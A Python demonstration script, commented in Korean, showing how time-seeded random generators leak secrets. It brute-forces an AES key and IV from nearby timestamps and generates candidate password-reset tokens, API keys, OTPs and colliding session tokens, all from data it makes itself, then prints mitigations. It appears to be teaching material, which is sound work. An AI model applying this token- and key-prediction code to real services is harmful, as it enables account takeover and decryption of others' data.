#!/usr/bin/env python3
"""
약한 난수 생성기 Exploit
공격 방법: 예측 가능한 시드를 이용하여 키, 토큰 등을 복구
"""

import random
import time
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def predict_key_from_timestamp(timestamp: int) -> bytes:
    """타임스탬프로부터 키 예측"""
    random.seed(timestamp)
    key_bytes = [random.randint(0, 255) for _ in range(16)]
    return bytes(key_bytes)

def predict_session_token(timestamp: int) -> str:
    """세션 토큰 예측"""
    random.seed(timestamp)
    token = ''.join(random.choices('0123456789abcdef', k=32))
    return token

def brute_force_timestamp_key():
    """타임스탬프 기반 키 브루트포스"""
    print("=== 타임스탬프 기반 키 브루트포스 ===\n")

    # 공격 대상 암호문 (실제 상황에서는 가로챈 데이터)
    target_plaintext = "Secret message"

    # 현재 시간에 생성된 키로 암호화된 데이터라고 가정
    current_time = int(time.time())
    actual_key = predict_key_from_timestamp(current_time)

    # 암호화
    random.seed(current_time + 1)
    iv = bytes([random.randint(0, 255) for _ in range(16)])
    cipher = AES.new(actual_key, AES.MODE_CBC, iv)
    from Crypto.Util.Padding import pad
    ciphertext = cipher.encrypt(pad(target_plaintext.encode(), AES.block_size))
    encrypted_data = base64.b64encode(iv + ciphertext).decode()

    print(f"가로챈 암호문: {encrypted_data}")
    print(f"대략적인 암호화 시간: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(current_time))}\n")

    # 공격 시작: 최근 시간대의 키를 브루트포스
    print("[*] 키 브루트포스 시작 (최근 60초 범위)...\n")

    for offset in range(-30, 31):  # ±30초 범위
        test_timestamp = current_time + offset
        test_key = predict_key_from_timestamp(test_timestamp)

        # IV도 예측
        random.seed(test_timestamp + 1)
        test_iv = bytes([random.randint(0, 255) for _ in range(16)])

        try:
            # 복호화 시도
            data = base64.b64decode(encrypted_data)
            iv_from_data = data[:16]
            ct_from_data = data[16:]

            # IV가 일치하는지 확인
            if test_iv == iv_from_data:
                cipher = AES.new(test_key, AES.MODE_CBC, test_iv)
                plaintext = unpad(cipher.decrypt(ct_from_data), AES.block_size).decode()

                print(f"[+] 키 발견!")
                print(f"    타임스탬프: {test_timestamp} ({time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(test_timestamp))})")
                print(f"    키: {test_key.hex()}")
                print(f"    복호화된 평문: {plaintext}")
                return test_key
        except:
            pass

    print("[-] 키를 찾지 못했습니다.")
    return None

def predict_password_reset_token():
    """비밀번호 재설정 토큰 예측"""
    print("\n=== 비밀번호 재설정 토큰 예측 공격 ===\n")

    target_user = "victim"
    current_time = int(time.time())

    print(f"타겟 사용자: {target_user}")
    print(f"현재 시간: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(current_time))}\n")

    # 최근 시간대의 토큰 생성 시도
    print("[*] 가능한 토큰 생성 중 (최근 60초)...\n")

    possible_tokens = []
    for offset in range(-30, 31):
        timestamp = current_time + offset
        data = f"{target_user}:{timestamp}"
        token = hashlib.md5(data.encode()).hexdigest()
        possible_tokens.append((timestamp, token))

    # 처음 5개만 출력
    print("가능한 토큰 (일부):")
    for timestamp, token in possible_tokens[:5]:
        time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
        print(f"  {time_str}: {token}")

    print(f"\n[+] 총 {len(possible_tokens)}개의 가능한 토큰 생성됨")
    print("[!] 공격자는 이 토큰들을 시도하여 비밀번호를 재설정할 수 있습니다!")

    return possible_tokens

def predict_api_key():
    """API 키 예측 공격"""
    print("\n=== API 키 예측 공격 ===\n")

    target_user = "alice"
    current_time = int(time.time())

    print(f"타겟 사용자: {target_user}")
    print("[*] 사용자가 방금 계정을 생성했다고 가정\n")

    # 최근 시간대의 API 키 예측
    print("[*] 가능한 API 키 생성 중...\n")

    for offset in range(-10, 11):
        timestamp = current_time + offset
        data = f"{target_user}:{timestamp}"
        api_key = hashlib.sha256(data.encode()).hexdigest()

        if offset == 0:  # 실제 키
            print(f"[+] 예측된 API 키 (현재 시간): {api_key}")
            print(f"    타임스탬프: {timestamp}\n")

    print("[!] 공격자가 계정 생성 시간을 알면 API 키를 예측할 수 있습니다!")

def predict_otp():
    """OTP 예측 공격"""
    print("\n=== OTP 예측 공격 ===\n")

    user_id = "user123"
    current_time = int(time.time())
    time_window = current_time // 30  # 30초 윈도우

    print(f"타겟 사용자: {user_id}")
    print(f"현재 시간 윈도우: {time_window}\n")

    # 현재 윈도우의 OTP 예측
    random.seed(time_window + hash(user_id))
    predicted_otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])

    print(f"[+] 예측된 OTP: {predicted_otp}")
    print("[!] 시드가 예측 가능하므로 OTP를 미리 계산할 수 있습니다!")

def demonstrate_session_token_collision():
    """세션 토큰 충돌 시연"""
    print("\n=== 세션 토큰 충돌 공격 ===\n")

    # 같은 시간에 생성된 토큰은 동일함
    timestamp = int(time.time())

    tokens = []
    for i in range(3):
        random.seed(timestamp)
        token = ''.join(random.choices('0123456789abcdef', k=32))
        tokens.append(token)

    print("같은 타임스탬프로 생성된 토큰:")
    for i, token in enumerate(tokens):
        print(f"  토큰 {i+1}: {token}")

    if len(set(tokens)) == 1:
        print("\n[!] 모든 토큰이 동일합니다!")
        print("    여러 사용자가 같은 시간에 로그인하면 세션을 탈취당할 수 있습니다!")

if __name__ == "__main__":
    print("=" * 60)
    print("약한 난수 생성기 Exploit 데모")
    print("=" * 60 + "\n")

    # 1. 타임스탬프 기반 키 브루트포스
    brute_force_timestamp_key()

    # 2. 비밀번호 재설정 토큰 예측
    predict_password_reset_token()

    # 3. API 키 예측
    predict_api_key()

    # 4. OTP 예측
    predict_otp()

    # 5. 세션 토큰 충돌
    demonstrate_session_token_collision()

    print("\n" + "=" * 60)
    print("해결 방법:")
    print("1. secrets 모듈 또는 os.urandom() 사용")
    print("2. 암호학적으로 안전한 난수 생성기 사용 (CSPRNG)")
    print("3. 예측 불가능한 시드 사용")
    print("4. 충분한 엔트로피 확보")
    print("=" * 60)
